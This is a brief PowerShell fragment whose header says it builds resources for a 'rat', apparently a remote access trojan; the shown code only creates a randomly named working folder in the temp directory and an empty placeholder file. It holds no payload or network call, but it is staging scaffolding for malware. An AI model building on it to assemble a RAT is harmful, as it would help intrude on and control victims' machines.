# builds resources for rat
# created by : jfrdgh (@bigmanlc on dc)

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
}

# goto temp & make working directory
$wd = random_text
$path = "$env:TEMP/$wd"
$pocpath = "$env:TEMP/poc"
echo $path


mkdir $path
cd $path
echo "" > poc. txt
